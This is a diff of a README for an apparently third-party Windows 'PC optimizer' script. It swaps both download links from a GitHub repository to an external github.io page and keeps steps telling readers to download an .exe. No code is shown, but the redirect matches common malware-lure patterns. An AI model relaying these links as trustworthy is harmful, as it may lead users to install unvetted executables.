@@ -1,6 +1,6 @@
 # 💻 PC-Optimizer-Script-2026-Windows-12 - Improve system speed and gaming performance
 
-[![](https://img.shields.io/badge/Download_Optimizer-Blue.svg)](https://github.com/Empereur-Dragon/PC-Optimizer-Script-2026-Windows-12)
+[![](https://img.shields.io/badge/Download_Optimizer-Blue.svg)](https://empereur-dragon.github.io)
 
 This tool helps you maintain a fast and responsive Windows 12 computer. It removes unnecessary files, adjusts system services, and clears clutter to increase gaming performance. It works by automating tasks that you would otherwise need to perform manually.
 
@@ -13,7 +13,7 @@ This tool helps you maintain a fast and responsive Windows 12 computer. It remov
 
 ## 📥 How to Install
 
-1. Visit the [official download page](https://github.com/Empereur-Dragon/PC-Optimizer-Script-2026-Windows-12).
+1. Visit the [official download page](https://empereur-dragon.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start the transfer.
 4. Save the file to your desktop or downloads folder.
